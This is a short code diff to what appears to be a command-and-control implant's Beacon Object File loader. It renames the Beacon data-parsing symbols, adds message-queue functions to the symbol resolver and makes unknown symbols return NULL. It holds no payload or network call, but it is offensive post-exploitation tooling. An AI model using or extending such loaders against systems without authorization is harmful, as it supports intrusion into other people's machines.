@@ -52,8 +52,8 @@ SECTION_CODE PVOID ObjectResolveSymbol(char* task_uuid, PMESSAGE_QUEUE queue, PS
 	if (pic_strncmp("Beacon", Symbol, 6) == 0) {
 		if (pic_strcmp("BeaconDataParse", Symbol) == 0) {
 			Resolved = BeaconDataParse;
-		} else if (pic_strcmp("BeaconDataInt", Symbol) == 0) {
-			Resolved = BeaconDataInt;
+		} else if (pic_strcmp("BeaconDataInt32", Symbol) == 0) {
+			Resolved = BeaconDataInt32;
 		} else if (pic_strcmp("BeaconDataShort", Symbol) == 0) {
 			Resolved = BeaconDataShort;
 		} else if (pic_strcmp("BeaconDataLength", Symbol) == 0) {
@@ -72,14 +72,24 @@ SECTION_CODE PVOID ObjectResolveSymbol(char* task_uuid, PMESSAGE_QUEUE queue, PS
 			Resolved = BeaconWsprintf;
 		} else if (pic_strcmp("BeaconSprintf", Symbol) == 0) {
 			Resolved = BeaconSprintf;
-		} else if (pic_strcmp("ParseInt32", Symbol) == 0) {
-			Resolved = ParseInt32;
-		} else if (pic_strcmp("ParseString", Symbol) == 0) {
-			Resolved = ParseString;
-		} else if (pic_strcmp("ParseWideString", Symbol) == 0) {
-			Resolved = ParseWideString;
+		} else if (pic_strcmp("BeaconParseInt32", Symbol) == 0) {
+			Resolved = BeaconParseInt32;
+		} else if (pic_strcmp("BeaconParseString", Symbol) == 0) {
+			Resolved = BeaconParseString;
+		} else if (pic_strcmp("BeaconParseWideString", Symbol) == 0) {
+			Resolved = BeaconParseWideString;
 		} else if (pic_strcmp("BeaconCharToWideString", Symbol) == 0){
 			Resolved = BeaconCharToWideString;
+		} else if(pic_strcmp("BeaconCreateMessageQueue", Symbol) == 0) {
+			Resolved = BeaconCreateMessageQueue;
+		} else if (pic_strcmp("BeaconAddMessageToQueue", Symbol) == 0) {
+			Resolved = BeaconAddMessageToQueue;
+		} else if (pic_strcmp("BeaconCleanUpMessageQueue", Symbol) == 0) {
+			Resolved = BeaconCleanUpMessageQueue;
+		} else if (pic_strcmp("BeaconSendAllMessages", Symbol) == 0) {
+			Resolved = BeaconSendAllMessages;
+		} else {
+			return NULL;
 		}
 	} else {
 		//
@@ -516,7 +526,7 @@ SECTION_CODE int do_bof(char* task_uuid, PBYTE pbof_content, PBYTE args, int arg
 	status = ObjectLdr(task_uuid, pbof_content, args, argc, file_args, queue, "go");
 
     if (!status) {
-        // pic_strcatW(buffer_message, L"[!] Failed to execute object file\n");
+        // pic_strcatW(buffer_message, L"[!] Failed to execute object file\n");	
 		BeaconAddMessageToQueue(queue, L"[!] Failed to execute object file\n");
     }
     else {
